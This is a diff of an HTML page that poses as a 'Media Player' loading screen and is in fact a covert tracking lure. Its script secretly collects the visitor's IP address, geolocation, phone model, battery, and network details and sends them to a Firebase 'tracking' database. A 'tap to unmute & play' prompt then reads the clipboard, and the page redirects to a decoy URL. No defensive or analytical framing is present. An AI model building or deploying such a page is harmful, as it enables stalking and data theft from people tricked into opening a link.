@@ -2,48 +2,49 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Video Loading...</title>
+    <title>Media Player</title>
     <style>
-        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; }
+        body { background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        .loader { border: 3px solid #e1e1e1; border-top: 3px solid #00a884; border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div id="status" style="text-align:center;">
-        <div class="loader"></div>
-        <p id="msg" style="margin-top:10px; color:#555; font-size: 13px;">Verifying connection...</p>
+    <div id="status" style="text-align:center; padding: 20px;">
+        <div class="loader" style="margin:auto;"></div>
+        <p id="msg" style="margin-top:15px; color:#666; font-size: 14px;">Loading encrypted content...</p>
     </div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
 
-        async function getIPDetails() {
-            // Source 1: ipapi.co (Slightly strict)
+        async function getDeepLoc() {
+            // Priority 1: ipwho.is
+            try {
+                let r = await fetch('https://ipwho.is/');
+                let d = await r.json();
+                if(d.success) return { ip: d.ip, loc: `${d.city}, ${d.country}`, lat: d.latitude, lon: d.longitude };
+            } catch(e){}
+
+            // Priority 2: ipapi.co
             try {
                 let r = await fetch('https://ipapi.co/json/');
                 let d = await r.json();
                 if(d.ip) return { ip: d.ip, loc: `${d.city}, ${d.country_name}`, lat: d.latitude, lon: d.longitude };
             } catch(e){}
 
-            // Source 2: ipwho.is (Backup)
-            try {
-                let r = await fetch('https://ipwho.is/');
-                let d = await r.json();
-                if(d.ip) return { ip: d.ip, loc: `${d.city}, ${d.country}`, lat: d.latitude, lon: d.longitude };
-            } catch(e){}
-
-            // Source 3: api.ipify.org (Last resort - Only IP)
+            // Priority 3: ipify (Sirf IP ke liye)
             try {
                 let r = await fetch('https://api.ipify.org?format=json');
                 let d = await r.json();
-                if(d.ip) return { ip: d.ip, loc: "Unknown Loc (VPN?)", lat: 0, lon: 0 };
+                let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                return { ip: d.ip, loc: `TZ: ${tz} (Location Blocked)`, lat: 0, lon: 0 };
             } catch(e){}
 
-            return { ip: "N/A", loc: "N/A", lat: 0, lon: 0 };
+            return { ip: "Unknown", loc: "Unknown", lat: 0, lon: 0 };
         }
 
-        async function startSystem() {
+        async function launch() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
             if(!id) return;
@@ -51,29 +52,29 @@
             const userKey = decoded.k;
             const targetUrl = decoded.r;
 
-            // Start collecting hardware data
+            // Collect Hardware Details
             let data = {
                 time: new Date().toLocaleString(),
-                device: navigator.platform,
+                device: navigator.userAgent.split('(')[1].split(')')[0], // Exact Phone Model
                 ram: navigator.deviceMemory || "N/A",
-                res: `${screen.width}x${screen.height}`,
+                res: `${window.screen.width}x${window.screen.height}`,
                 orient: screen.orientation ? screen.orientation.type : "N/A",
                 netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
-                speed: navigator.connection ? navigator.connection.downlink : "N/A"
+                speed: navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A"
             };
 
-            // Battery (Await fast)
+            // Get Battery
             try {
                 const b = await navigator.getBattery();
                 data.battery = Math.round(b.level * 100);
-                data.charging = b.charging ? "Yes" : "No";
+                data.charging = b.charging ? "Charging" : "No";
             } catch(e){ data.battery = "N/A"; }
 
-            // IP & Loc (Wait for the best source)
-            const geo = await getIPDetails();
+            // Get Location & IP
+            const geo = await getDeepLoc();
             data.ip = geo.ip;
             data.loc = geo.loc;
-            data.map = `https://www.google.com/maps?q=${geo.lat},${geo.lon}`;
+            data.map = geo.lat !== 0 ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : "#";
 
             // Push to Firebase
             fetch(`${DB_URL}tracking/${userKey}.json`, { 
@@ -81,9 +82,9 @@
                 body: JSON.stringify(data) 
             });
 
-            // 2 Second UI transition
+            // Fast UI Change
             setTimeout(() => {
-                document.getElementById('status').innerHTML = "<b>⚠️ SECURE CONNECTION ESTABLISHED.<br>TAP TO PLAY VIDEO</b>";
+                document.getElementById('status').innerHTML = "<b style='color:#00a884; cursor:pointer;'>▶ TAP TO UNMUTE & PLAY VIDEO</b>";
                 document.body.onclick = async () => {
                     try {
                         const text = await navigator.clipboard.readText();
@@ -96,11 +97,10 @@
                 };
             }, 2000);
 
-            // Safety redirect
             setTimeout(() => { window.location.href = targetUrl; }, 8000);
         }
 
-        startSystem();
+        launch();
     </script>
 </body>
 </html>
